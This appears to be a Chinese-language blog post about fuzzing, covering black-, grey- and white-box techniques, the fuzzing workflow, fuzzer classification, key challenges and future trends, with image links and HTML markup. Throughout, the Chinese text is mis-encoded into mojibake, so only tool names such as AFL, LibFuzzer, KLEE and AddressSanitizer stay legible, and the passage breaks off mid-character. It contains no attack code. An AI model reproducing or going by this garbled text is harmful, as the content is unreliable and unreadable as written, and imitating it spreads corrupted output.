äº’è”ç½‘å’Œä¸–ç•Œæ•°å­—ç»æµè¿è¡Œåœ¨ä¸€ä¸ªå…±äº«çš„ã€å…³é”®çš„å¼€æºè½¯ä»¶ï¼ˆOSSï¼‰åŸºç¡€è®¾æ–½ä¸Šã€‚å•ä¸ªåº“ä¸­çš„å®‰å…¨ç¼ºé™·å¯èƒ½ä¼šäº§ç”Ÿä¸¥é‡åæœã€‚ä¾‹å¦‚ï¼ŒOpenSSLå®ç°äº†ç”¨äºå®‰å…¨é€šä¿¡çš„åè®®ï¼Œå¹¶è¢«åŒ…æ‹¬å¤§å¤šæ•°HTTPSç½‘ç«™åœ¨å†…çš„InternetæœåŠ¡å™¨å¹¿æ³›ä½¿ç”¨ã€‚æ—©æœŸç‰ˆæœ¬çš„OpenSSLä¸­çš„â€œå¿ƒè„æ»´è¡€â€æ¼æ´ä¼šæ³„éœ²æœºå¯†æ•°æ®å¹¶é€ æˆå·¨å¤§çš„ç»æµæŸå¤±ã€‚ç›®å‰ï¼Œfuzzingæ˜¯è¿™æ–¹é¢æœ€æœ‰å‰é€”çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œç°é˜¶æ®µæœ‰ä¸‰ç§ä¸»è¦çš„fuzzingæŠ€æœ¯ï¼šé»‘ç›’ï¼Œç°ç›’å’Œç™½ç›’fuzzingã€‚</p><p>â€‹    é»‘ç›’fuzzingæ˜¯åœ¨ä¸äº†è§£ç¨‹åºå†…éƒ¨æ„é€ çš„æƒ…å†µä¸‹äº§ç”Ÿè¾“å…¥çš„ã€‚å…¶æœ‰ä¸¤ä¸ªä¸»è¦çš„å˜ç§ï¼šçªå˜å‹å’Œç”Ÿæˆå‹ã€‚åœ¨çªå˜å‹é»‘ç›’fuzzingä¸­ï¼Œfuzzingä»ä¸€ä¸ªæˆ–å¤šä¸ªç§å­è¾“å…¥å¼€å§‹ã€‚è¿™äº›ç§å­è¢«ä¿®æ”¹ä»¥äº§ç”Ÿæ–°çš„è¾“å…¥ã€‚éšæœºçªå˜è¢«åº”ç”¨äºè¾“å…¥ä¸­çš„éšæœºä½ç½®ã€‚åœ¨ç”Ÿæˆå‹é»‘fuzzingä¸­ï¼Œè¾“å…¥æ˜¯ä»å¤´å¼€å§‹ç”Ÿæˆçš„ã€‚ å¦‚æœæä¾›äº†è¾“å…¥æ ¼å¼çš„ç»“æ„è§„èŒƒï¼Œå°±ä¼šä»¥æ­¤ç”Ÿæˆç¬¦åˆè¯­æ³•è§„èŒƒçš„æ–°è¾“å…¥ã€‚Peachæ˜¯ä¸€ä¸ªæµè¡Œçš„é»‘ç›’fuzzingå·¥å…·ã€‚</p><p>â€‹    ç°ç›’fuzzingå¾€å¾€ä¼šåˆ©ç”¨ç¨‹åºæ¥è·å¾—è½»é‡çº§çš„åé¦ˆï¼Œç”¨äºæŒ‡å¯¼fuzzerçš„å·¥ä½œã€‚é€šå¸¸æ¥è¯´ï¼Œç¨‹åºä¸­çš„ä¸€äº›æ§åˆ¶ä½ç½®åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æµ‹ï¼Œå¹¶æä¾›åˆå§‹ç§å­è¯­æ–™åº“ã€‚ ç§å­è¾“å…¥è¢«æ”¹å˜ä»¥äº§ç”Ÿæ–°çš„è¾“å…¥ã€‚äº§ç”Ÿçš„è¾“å…¥è¦†ç›–äº†æ–°çš„æ§åˆ¶ä½ç½®ï¼Œä»è€Œå¢åŠ äº†ä»£ç è¦†ç›–ç‡ï¼Œè¿›è€Œè¢«æ·»åŠ åˆ°ç§å­è¯­æ–™åº“ä¸­ã€‚è¦†ç›–ç‡åé¦ˆå…è®¸ç°ç›’fuzzingé€æ¸æ·±å…¥åˆ°ä»£ç ä¸­ã€‚ä¸ºäº†è¯†åˆ«é”™è¯¯å’Œæ¼æ´ï¼Œæ¸…ç†ç¨‹åºä¼šå°†æ–­è¨€æ³¨å…¥åˆ°ç¨‹åºä¸­ã€‚ç°æœ‰çš„ç°ç›’Fuzzingå·¥å…·åŒ…æ‹¬AFLã€LibFuzzerå’ŒHonggfuzzã€‚</p><p>â€‹    ç™½ç›’fuzzingæŠ€æœ¯æ˜¯åŸºäºä¸€ç§å«åšç¬¦å·æ‰§è¡Œçš„æŠ€æœ¯ï¼Œå®ƒä½¿ç”¨ç¨‹åºåˆ†æå’Œçº¦æŸè§£ç®—å™¨æ¥ç³»ç»Ÿåœ°åˆ—ä¸¾å¯èƒ½å‡ºç°æ¼æ´çš„ç¨‹åºè·¯å¾„ã€‚ åœ¨ç™½ç›’fuzzingä¸­ç”¨ä½œåå°çš„çº¦æŸè§£ç®—å™¨æ˜¯Satisfiability Modulo Theory(SMT)è§£ç®—å™¨ï¼Œå®ƒå…è®¸å¯¹ï¼ˆæ— é‡å­ï¼‰ä¸€é˜¶é€»è¾‘å…¬å¼è¿›è¡Œæ¨ç†ï¼Œå…¶å¹³ç­‰å’Œå‡½æ•°/è°“è¯­ç¬¦å·æ¥è‡ªä¸åŒçš„èƒŒæ™¯ç†è®ºã€‚ç™½ç›’fuzzerä¼šè®¡ç®—ä¸€ä¸ªè¾“å…¥içš„è·¯å¾„æ¡ä»¶ä¸ièµ°è¿‡ç›¸åŒè·¯å¾„çš„è¾“å…¥é›†åˆã€‚ç»™å®šä¸€ä¸ªç§å­è¾“å…¥ï¼Œè®¡ç®—å¹¶æ”¹å˜è·¯å¾„æ¡ä»¶ï¼ˆä¸æ”¹å˜ç¨‹åºè¾“å…¥ç›¸åï¼‰ã€‚æ”¹å˜è·¯å¾„æ¡ä»¶ç„¶åè¢«å‘é€åˆ°çº¦æŸè§£ç®—å™¨ä»¥ç”Ÿæˆæ–°çš„è¾“å…¥ã€‚è¿™ç§æŠ€æœ¯çš„ä¸»è¦ä¼˜ç‚¹æ˜¯å…¶èƒ½å¤Ÿé€šè¿‡è·Ÿè¸ªåˆ°ç›®å‰ä¸ºæ­¢çš„æ‰€æœ‰è¾“å…¥çš„è·¯å¾„æ¡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ªç©¿è¿‡æ–°è·¯å¾„ï¼ˆæ–°æ§åˆ¶æµï¼‰çš„è¾“å…¥ã€‚ç°æœ‰çš„ç™½ç›’æ¨¡ç³Šå·¥å…·åŒ…æ‹¬KLEEå’ŒSAGEã€‚</p><h1 id="FuzzingåŸç†"><a href="#FuzzingåŸç†" class="headerlink" title="FuzzingåŸç†"></a>FuzzingåŸç†</h1><h2 id="Fuzzingçš„å·¥ä½œæµç¨‹"><a href="#Fuzzingçš„å·¥ä½œæµç¨‹" class="headerlink" title="Fuzzingçš„å·¥ä½œæµç¨‹"></a>Fuzzingçš„å·¥ä½œæµç¨‹</h2><p>â€‹    ä¸‹å›¾æè¿°äº†ä¼ ç»ŸFuzzingçš„å·¥ä½œæµç¨‹ï¼Œç”±å››ä¸ªä¸»è¦é˜¶æ®µç»„æˆï¼Œå³æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆé˜¶æ®µã€æµ‹è¯•ç”¨ä¾‹è¿è¡Œé˜¶æ®µã€ç¨‹åºæ‰§è¡ŒçŠ¶æ€ç›‘æ§å’Œå¼‚å¸¸åˆ†æã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145110707.png" alt="image-20210618145110707"></p><p>â€‹    Fuzzingæ˜¯ä»ç”Ÿæˆä¸€å †ç¨‹åºè¾“å…¥å¼€å§‹çš„ï¼Œä¹Ÿå°±æ˜¯æµ‹è¯•ç”¨ä¾‹ã€‚ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹çš„è´¨é‡ç›´æ¥å½±å“æµ‹è¯•æ•ˆæœã€‚è¾“å…¥åº”è¯¥å°½å¯èƒ½åœ°æ»¡è¶³è¢«æµ‹ç¨‹åºå¯¹è¾“å…¥æ ¼å¼çš„è¦æ±‚ã€‚è€Œå¦ä¸€æ–¹é¢ï¼Œè¾“å…¥åº”è¯¥è¶³å¤Ÿç¢ç‰‡åŒ–ï¼Œä»¥ä¾¿åœ¨å›¾1çš„æ¨¡ç³Šæµ‹è¯•å·¥ä½œè¿‡ç¨‹ä¸­å¯¼è‡´ç¨‹åºæ‰§è¡Œå‡ºç°é—®é¢˜ã€‚æ ¹æ®ç›®æ ‡ç¨‹åºï¼Œè¾“å…¥å¯ä»¥æ˜¯ä¸åŒæ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶ã€ç½‘ç»œé€šä¿¡æ•°æ®ã€å…·æœ‰ç‰¹å®šç‰¹å¾çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ç­‰ã€‚å¦‚ä½•äº§ç”Ÿè¶³å¤Ÿå¤šçš„æµ‹è¯•ç”¨ä¾‹æ˜¯ç°é˜¶æ®µFuzzingçš„ä¸»è¦æŒ‘æˆ˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæœ€å…ˆè¿›çš„æ¨¡ç³Šå™¨ä½¿ç”¨ä¸¤ç§ç”Ÿæˆå™¨ï¼Œå³åŸºäºç”Ÿæˆçš„ç”Ÿæˆå™¨å’ŒåŸºäºå˜å¼‚çš„ç”Ÿæˆå™¨ã€‚æµ‹è¯•ç”¨ä¾‹åœ¨ä¸Šä¸€é˜¶æ®µç”Ÿæˆåè¢«é€å…¥ç›®æ ‡ç¨‹åºã€‚æ¨¡ç³Šå™¨è‡ªåŠ¨å¯åŠ¨å’Œå®Œæˆç›®æ ‡ç¨‹åºçš„è¿‡ç¨‹ï¼Œå¹¶é©±åŠ¨ç›®æ ‡ç¨‹åºçš„æµ‹è¯•ç”¨ä¾‹å¤„ç†è¿‡ç¨‹ã€‚åœ¨æ‰§è¡Œä¹‹å‰ï¼Œåˆ†æäººå‘˜å¯ä»¥é…ç½®ç›®æ ‡ç¨‹åºçš„å¯åŠ¨å’Œç»“æŸæ–¹å¼ï¼Œå¹¶é¢„å…ˆå®šä¹‰å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ¨¡ç³Šå¤„ç†è¿‡ç¨‹ä¼šåœ¨é¢„å®šä¹‰çš„è¶…æ—¶ã€ç¨‹åºæ‰§è¡ŒæŒ‚èµ·æˆ–å´©æºƒæ—¶åœæ­¢ã€‚Fuzzerä¼šåœ¨ç›®æ ‡ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ç›‘æµ‹æ‰§è¡ŒçŠ¶æ€ï¼ŒæœŸå¾…å¼‚å¸¸å’Œå´©æºƒã€‚å¸¸ç”¨çš„å¼‚å¸¸ç›‘æµ‹æ–¹æ³•åŒ…æ‹¬å¯¹ç‰¹å®šç³»ç»Ÿä¿¡å·çš„ç›‘æµ‹ã€å´©æºƒå’Œå…¶ä»–è¿è§„è¡Œä¸ºã€‚å¯¹äºæ²¡æœ‰ç›´è§‚ç¨‹åºå¼‚å¸¸è¡Œä¸ºçš„è¿è§„è¡Œä¸ºï¼Œå¯ä»¥ä½¿ç”¨å¾ˆå¤šå·¥å…·ï¼ŒåŒ…æ‹¬AddressSanitizerã€DataFlowsanitizerã€ThreadSanitizerã€LeakSanitizerç­‰ã€‚å½“æ•æ‰åˆ°è¿è§„è¡Œä¸ºæ—¶ï¼ŒFuzzerä¼šå­˜å‚¨ç›¸åº”çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä¾›åè€…å›æ”¾å’Œåˆ†æã€‚åœ¨åˆ†æé˜¶æ®µï¼Œåˆ†æå‘˜è¯•å›¾ç¡®å®šæ•è·çš„è¿è§„è¡Œä¸ºçš„ä½ç½®å’Œæ ¹æœ¬åŸå› ã€‚åˆ†æé€šå¸¸åœ¨è°ƒè¯•å™¨çš„å¸®åŠ©ä¸‹è¿›è¡Œï¼Œå¦‚GDBã€windbgï¼Œæˆ–å…¶ä»–äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼Œå¦‚IDAProã€OllyDbgç­‰ã€‚äºŒè¿›åˆ¶å·¥å…·ï¼Œå¦‚Pinï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç›‘æµ‹æ”¶é›†çš„æµ‹è¯•ç”¨ä¾‹çš„ç¡®åˆ‡æ‰§è¡ŒçŠ¶æ€ï¼Œå¦‚çº¿ç¨‹ä¿¡æ¯ã€æŒ‡ä»¤ã€å¯„å­˜å™¨ä¿¡æ¯ç­‰ç­‰ã€‚</p><h2 id="Fuzzerçš„åˆ†ç±»"><a href="#Fuzzerçš„åˆ†ç±»" class="headerlink" title="Fuzzerçš„åˆ†ç±»"></a>Fuzzerçš„åˆ†ç±»</h2><p>â€‹    Fuzzerå¯ä»¥ä»¥å„ç§æ–¹å¼è¿›è¡Œåˆ†ç±»ï¼Œä¸»è¦åˆ†ä¸ºåŸºäºç”Ÿæˆçš„å’ŒåŸºäºçªå˜çš„[8]ã€‚</p><p>â€‹    å¯¹äºåŸºäºç”Ÿæˆçš„Fuzzerï¼Œéœ€è¦äº†è§£ç¨‹åºè¾“å…¥çš„çŸ¥è¯†ã€‚å¯¹äºæ–‡ä»¶æ ¼å¼çš„Fuzzingï¼Œé€šå¸¸éœ€è¦æä¾›ä¸€ä¸ªé¢„å…ˆå®šä¹‰æ–‡ä»¶æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚æµ‹è¯•ç”¨ä¾‹æ˜¯æ ¹æ®é…ç½®æ–‡ä»¶ç”Ÿæˆçš„ã€‚æœ‰äº†ç»™å®šçš„æ–‡ä»¶æ ¼å¼ï¼Œç”±åŸºäºç”Ÿæˆçš„Fuzzerç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹èƒ½å¤Ÿæ›´å®¹æ˜“åœ°é€šè¿‡ç¨‹åºçš„éªŒè¯ï¼Œå¹¶æ›´æœ‰å¯èƒ½æµ‹è¯•ç›®æ ‡ç¨‹åºçš„æ·±å±‚ä»£ç ã€‚ç„¶è€Œï¼Œå¦‚æœæ²¡æœ‰ä¸€ä¸ªå¥½çš„æ–‡ä»¶ï¼Œåˆ†ææ–‡ä»¶æ ¼å¼æ˜¯ä¸€é¡¹è‰°éš¾çš„å·¥ä½œã€‚å› æ­¤ï¼ŒåŸºäºçªå˜çš„Fuzzeræ›´å®¹æ˜“å¯åŠ¨ï¼Œä¹Ÿæ›´é€‚ç”¨ã€‚å¯¹äºåŸºäºçªå˜çš„æ¨¡ç³Šå™¨ï¼Œéœ€è¦ä¸€ç»„æœ‰æ•ˆçš„åˆå§‹è¾“å…¥ã€‚æµ‹è¯•ç”¨ä¾‹æ˜¯é€šè¿‡åˆå§‹è¾“å…¥çš„çªå˜å’ŒFuzzingè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æµ‹è¯•ç”¨ä¾‹äº§ç”Ÿçš„ã€‚ä¸‹è¡¨ä¸­æ¯”è¾ƒäº†åŸºäºç”Ÿæˆçš„fuzzerså’ŒåŸºäºçªå˜çš„fuzzersã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145552977.png" alt="image-20210618145552977"></p><p>â€‹    å°±å¯¹ç¨‹åºæºä»£ç çš„ä¾èµ–æ€§å’Œç¨‹åºåˆ†æçš„ç¨‹åº¦è€Œè¨€ï¼ŒFuzzingæŠ€æœ¯å¯ä»¥è¢«åˆ†ä¸ºç™½ç›’ã€ç°ç›’å’Œé»‘ç›’ã€‚ç™½ç›’å¯ä»¥æ¥è§¦åˆ°ç¨‹åºçš„æºä»£ç ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¯¹æºä»£ç çš„åˆ†ææ”¶é›†æ›´å¤šçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æµ‹è¯•ç”¨ä¾‹å¦‚ä½•å½±å“ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ã€‚é»‘ç›’æ˜¯æŒ‡åœ¨ä¸äº†è§£ç›®æ ‡ç¨‹åºå†…éƒ¨çš„æƒ…å†µä¸‹è¿›è¡ŒFuzzingã€‚ç°ç›’æµ‹è¯•åœ¨æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹ä¹Ÿèƒ½å·¥ä½œï¼Œå¹¶é€šè¿‡ç¨‹åºåˆ†æè·å¾—ç›®æ ‡ç¨‹åºçš„å†…éƒ¨ä¿¡æ¯ã€‚ä¸‹è¡¨ä¸­åˆ—å‡ºäº†ä¸€äº›å¸¸è§çš„ç™½ç›’ã€ç°ç›’å’Œé»‘ç›’fuzzerã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145642592.png" alt="image-20210618145642592"></p><p>â€‹    æ ¹æ®éå†ç¨‹åºä»£ç çš„ç­–ç•¥ï¼Œå¯ä»¥å°†Fuzzeråˆ†ä¸ºå®šå‘Fuzzingå’ŒåŸºäºè¦†ç›–çš„Fuzzingã€‚æœ‰æ–¹å‘çš„Fuzzeræ—¨åœ¨ç”Ÿæˆè¦†ç›–ç¨‹åºçš„ç›®æ ‡ä»£ç å’Œç›®æ ‡è·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ï¼Œè€ŒåŸºäºè¦†ç›–çš„Fuzzeræ—¨åœ¨ç”Ÿæˆè¦†ç›–å°½å¯èƒ½å¤šç¨‹åºä»£ç çš„æµ‹è¯•ç”¨ä¾‹ã€‚å®šå‘Fuzzingå¸Œæœ›å¯¹ç¨‹åºè¿›è¡Œæ›´å¿«çš„æµ‹è¯•ï¼Œè€ŒåŸºäºè¦†ç›–çš„Fuzzingåˆ™å¸Œæœ›è¿›è¡Œæ›´å½»åº•çš„æµ‹è¯•ï¼Œå¹¶å°½å¯èƒ½åœ°æ£€æµ‹æ›´å¤šçš„é”™è¯¯ã€‚ä½†å¯¹äºè¿™ä¸¤ç§æµ‹è¯•æ–¹æ³•è€Œè¨€ï¼Œå¦‚ä½•æå–æ‰§è¡Œè·¯å¾„çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªå…³é”®é—®é¢˜ã€‚</p><p>â€‹    æ ¹æ®å¯¹ç¨‹åºæ‰§è¡ŒçŠ¶æ€çš„ç›‘æ§å’Œæµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆä¹‹é—´æ˜¯å¦å­˜åœ¨åé¦ˆï¼Œå¯ä»¥å°†æ¨¡ç³Šå™¨åˆ†ä¸ºæ— åé¦ˆFuzzerå’Œæ™ºèƒ½Fuzzerã€‚æ™ºèƒ½Fuzzeræ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯è°ƒæ•´æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆï¼Œå³æµ‹è¯•ç”¨ä¾‹å¦‚ä½•å½±å“ç¨‹åºè¡Œä¸ºã€‚å¯¹äºåŸºäºçªå˜çš„Fuzzerï¼Œåé¦ˆä¿¡æ¯å¯ç”¨äºç¡®å®šå“ªéƒ¨åˆ†æµ‹è¯•ç”¨ä¾‹åº”è¯¥è¢«çªå˜ä»¥åŠçªå˜çš„æ–¹å¼ã€‚æ— åé¦ˆFuzzerè·å¾—äº†æ›´å¥½çš„æµ‹è¯•é€Ÿåº¦ï¼Œè€Œæ™ºèƒ½Fuzzeräº§ç”Ÿäº†æ›´å¥½çš„æµ‹è¯•ç”¨ä¾‹å¹¶è·å¾—äº†æ›´å¥½çš„æ•ˆç‡ã€‚</p><h1 id="Fuzzingä¸­çš„å…³é”®æŒ‘æˆ˜"><a href="#Fuzzingä¸­çš„å…³é”®æŒ‘æˆ˜" class="headerlink" title="Fuzzingä¸­çš„å…³é”®æŒ‘æˆ˜"></a>Fuzzingä¸­çš„å…³é”®æŒ‘æˆ˜</h1><p>â€‹    ä¼ ç»Ÿçš„Fuzzeråœ¨å®è·µä¸­é€šå¸¸é‡‡ç”¨åŸºäºéšæœºçš„Fuzzingç­–ç•¥ã€‚ç¨‹åºåˆ†ææŠ€æœ¯çš„å±€é™æ€§å¯¼è‡´äº†ç°åœ¨çš„çŠ¶å†µï¼Œå³Fuzzerä¸å¤Ÿæ™ºèƒ½ã€‚å› æ­¤ï¼ŒFuzzingä»ç„¶é¢ä¸´è®¸å¤šæŒ‘æˆ˜ã€‚æˆ‘ä»¬åˆ—å‡ºä¸€äº›å…³é”®çš„æŒ‘æˆ˜å¦‚ä¸‹ï¼š</p><h2 id="å¦‚ä½•å¯¹ç§å­è¾“å…¥è¿›è¡Œçªå˜"><a href="#å¦‚ä½•å¯¹ç§å­è¾“å…¥è¿›è¡Œçªå˜" class="headerlink" title="å¦‚ä½•å¯¹ç§å­è¾“å…¥è¿›è¡Œçªå˜"></a>å¦‚ä½•å¯¹ç§å­è¾“å…¥è¿›è¡Œçªå˜</h2><p>â€‹    åŸºäºçªå˜çš„ç”Ÿæˆç­–ç•¥å› å…¶æ–¹ä¾¿å’Œå®¹æ˜“è®¾ç½®è€Œè¢«æœ€å…ˆè¿›çš„Fuzzerå¹¿æ³›ä½¿ç”¨[9]ã€‚ç„¶è€Œï¼Œå¦‚ä½•å˜å¼‚å¹¶ç”Ÿæˆèƒ½å¤Ÿè¦†ç›–æ›´å¤šç¨‹åºè·¯å¾„å’Œæ›´å®¹æ˜“è§¦å‘é”™è¯¯çš„æµ‹è¯•ç”¨ä¾‹æ˜¯ä¸€ä¸ªå…³é”®çš„æŒ‘æˆ˜ã€‚å…·ä½“æ¥è¯´ï¼ŒåŸºäºçªå˜çš„Fuzzeråœ¨è¿›è¡Œçªå˜æ—¶éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>åœ¨å“ªé‡Œçªå˜</li><li>å¦‚ä½•çªå˜</li></ul><p>â€‹    åªæœ‰å°‘æ•°å…³é”®ä½ç½®çš„çªå˜ä¼šå½±å“æ‰§è¡Œçš„æ§åˆ¶æµç¨‹ã€‚å› æ­¤ï¼Œå¦‚ä½•å®šä½è¿™äº›å…³é”®ä½ç½®æ˜¯éå¸¸é‡è¦çš„ã€‚æ­¤å¤–ï¼ŒFuzzerå¯¹å…³é”®ä½ç½®çš„çªå˜æ–¹å¼æ˜¯å¦ä¸€ä¸ªå…³é”®é—®é¢˜ï¼Œå³å¦‚ä½•ç¡®å®šå¯ä»¥å°†æµ‹è¯•å¼•å‘ç¨‹åºçš„æœ‰æ½œåœ¨å±é™©è·¯å¾„çš„å€¼ã€‚æ€»è€Œè¨€ä¹‹ï¼Œç›²ç›®çš„çªå˜æµ‹è¯•ç”¨ä¾‹ä¼šé€ æˆæµ‹è¯•èµ„æºçš„ä¸¥é‡æµªè´¹ï¼Œè€Œæ›´å¥½çš„çªå˜ç­–ç•¥å¯ä»¥æ˜¾è‘—æé«˜æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡ã€‚</p><h2 id="ä½ä»£ç è¦†ç›–ç‡"><a href="#ä½ä»£ç è¦†ç›–ç‡" class="headerlink" title="ä½ä»£ç è¦†ç›–ç‡"></a>ä½ä»£ç è¦†ç›–ç‡</h2><p>â€‹    æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ä»£è¡¨äº†æ›´é«˜çš„ç¨‹åºæ‰§è¡ŒçŠ¶æ€è¦†ç›–ç‡ï¼Œä»¥åŠæ›´å½»åº•çš„æµ‹è¯•ã€‚å…ˆå‰çš„ä¸€äº›å·¥ä½œå·²ç»è¯æ˜ï¼Œè¦†ç›–ç‡è¶Šé«˜ï¼Œå‘ç°é—®é¢˜çš„æ¦‚ç‡å°±è¶Šå¤§ã€‚ç„¶è€Œï¼Œå¤§å¤šæ•°æµ‹è¯•ç”¨ä¾‹åªè¦†ç›–äº†ç›¸åŒçš„å‡ æ¡è·¯å¾„ï¼Œè€Œå¤§éƒ¨åˆ†çš„ä»£ç é€»è¾‘å´æ— æ³•è§¦åŠã€‚å› æ­¤ï¼Œä»…ä»…é€šè¿‡å¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå’ŒæŠ•å…¥æµ‹è¯•èµ„æºæ¥å®ç°é«˜è¦†ç›–ç‡å¹¶ä¸æ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹©ã€‚åŸºäºè¦†ç›–ç‡çš„Fuzzerå°†åœ¨ç¨‹åºåˆ†ææŠ€æœ¯çš„å¸®åŠ©ä¸‹è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚ç¨‹åºåˆ†æå·¥å…·ã€‚</p><h2 id="é€šè¿‡éªŒè¯"><a href="#é€šè¿‡éªŒè¯" class="headerlink" title="é€šè¿‡éªŒè¯"></a>é€šè¿‡éªŒè¯</h2><p>â€‹    ç¨‹åºé€šå¸¸åœ¨è§£æå’Œå¤„ç†ä¹‹å‰å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ã€‚éªŒè¯çš„ä½œç”¨æ˜¯ä¿æŠ¤ç¨‹åºï¼ŒèŠ‚çœè®¡ç®—èµ„æºï¼Œä¿æŠ¤ç¨‹åºå…å—æ— æ•ˆè¾“å…¥å’Œæ¶æ„æ„å»ºçš„è¾“å…¥æ‰€é€ æˆçš„æŸå®³ã€‚æ— æ•ˆçš„æµ‹è¯•ç”¨ä¾‹æ€»æ˜¯è¢«å¿½ç•¥æˆ–ä¸¢å¼ƒçš„ã€‚Magic numbersã€Magic stringsã€ç‰ˆæœ¬å·æ£€æŸ¥å’Œæ ¡éªŒæ˜¯ç¨‹åºä¸­å¸¸ç”¨çš„éªŒè¯æ–¹æ³•ã€‚é»‘ç›’å’Œç°ç›’Fuzzerç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹å¾ˆéš¾é€šè¿‡ç”Ÿæˆç­–ç•¥çš„éªŒè¯ï¼Œè¿™ä¼šå¯¼è‡´Fuzzingå¤„ç†çš„æ•ˆç‡ç›¸å½“ä½ã€‚å› æ­¤ï¼Œå¦‚ä½•é€šè¿‡éªŒè¯æ˜¯å¦ä¸€ä¸ªå…³é”®æŒ‘æˆ˜ã€‚</p><h1 id="Fuzzingçš„æ–°è¶‹åŠ¿"><a href="#Fuzzingçš„æ–°è¶‹åŠ¿" class="headerlink" title="Fuzzingçš„æ–°è¶‹åŠ¿"></a>Fuzzingçš„æ–°è¶‹åŠ¿</h1><p>â€‹    ä½œä¸ºä¸€ç§è‡ªåŠ¨æ£€æµ‹æ¼æ´çš„æ–¹æ³•ï¼ŒFuzzingå·²ç»æ˜¾ç¤ºå‡ºå®ƒçš„é«˜æ•ˆåŠ›å’Œé«˜æ•ˆç‡ã€‚ç„¶è€Œï¼Œæ­£å¦‚ç¬¬ä¸‰èŠ‚æ‰€è¿°ï¼Œä»æœ‰è®¸å¤šæŒ‘æˆ˜éœ€è¦è§£å†³ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸‹è‡ªå·±å…³äºFuzzingå‘å±•è¶‹åŠ¿çš„ç†è§£ã€‚</p><p>â€‹    é¦–å…ˆï¼Œæ™ºèƒ½FuzzingæŠ€æœ¯ä¸ºFuzzingçš„æ”¹è¿›æä¾›äº†æ›´å¤šå¯èƒ½æ€§ã€‚åœ¨ä»¥å‰çš„å·¥ä½œä¸­ï¼Œä¼ ç»Ÿçš„é™æ€å’ŒåŠ¨æ€åˆ†æè¢«æ•´åˆåˆ°Fuzzingä¸­ï¼Œä»¥å¸®åŠ©æ”¹å–„è¿™ä¸€è¿‡ç¨‹ã€‚æ•´ä½“ä¸Šæ¥çœ‹å·²ç»æœ‰äº†ä¸€å®šçš„æ”¹è¿›ï¼Œä½†è¿˜æ˜¯å¾ˆæœ‰é™ã€‚æ™ºèƒ½FuzzingæŠ€æœ¯é€šè¿‡å„ç§æ–¹å¼æ”¶é›†ç›®æ ‡ç¨‹åºçš„æ‰§è¡Œä¿¡æ¯ï¼Œèƒ½å¤Ÿå¯¹Fuzzingè¿‡ç¨‹è¿›è¡Œäº†æ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œå¹¶æå‡ºäº†å¾ˆå¤šFuzzingç­–ç•¥ã€‚éšç€å¯¹ä¸åŒç±»å‹æ¼æ´çš„æ·±å…¥äº†è§£ï¼Œå¹¶åˆ©ç”¨æ¼æ´çš„ç‰¹ç‚¹è¿›è¡Œæ¨¡ç³Šå¤„ç†ï¼Œæ™ºèƒ½æ¨¡ç³Šå¤„ç†å¯ä»¥å¸®åŠ©å‘ç°æ›´å¤æ‚çš„æ¼æ´ã€‚</p><p>â€‹    ç¬¬äºŒï¼Œæ–°æŠ€æœ¯å¯ä»¥åœ¨è®¸å¤šæ–¹é¢å¸®åŠ©æ”¹å–„è„†å¼±æ€§ã€‚æœºå™¨å­¦ä¹ å’Œç›¸å…³æŠ€æœ¯ç­‰è¿™ç±»æ–°å…´æŠ€æœ¯å·²ç»è¢«ç”¨æ¥æ”¹å–„æ¨¡ç³Šæµ‹è¯•ä¸­çš„æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆã€‚å¦‚ä½•å°†æ–°æŠ€æœ¯çš„ä¼˜åŠ¿å’Œç‰¹ç‚¹ä¸Fuzzingç»“åˆèµ·æ¥ï¼Œå¦‚ä½•å°†Fuzzingä¸­çš„å…³é”®æŒ‘æˆ˜è½¬åŒ–æˆ–åˆ†å‰²æˆæ–°æŠ€æœ¯æ‰€æ“…é•¿çš„é—®é¢˜ï¼Œæ˜¯å¦ä¸€ä¸ªå€¼å¾—è€ƒè™‘çš„é—®é¢˜ã€‚</p><p>â€‹    ç¬¬ä¸‰ï¼Œæ–°çš„ç³»ç»Ÿç‰¹å¾å’Œç¡¬ä»¶ç‰¹å¾ä¹Ÿä¸åº”è¯¥è¢«å¿½è§†ã€‚æ 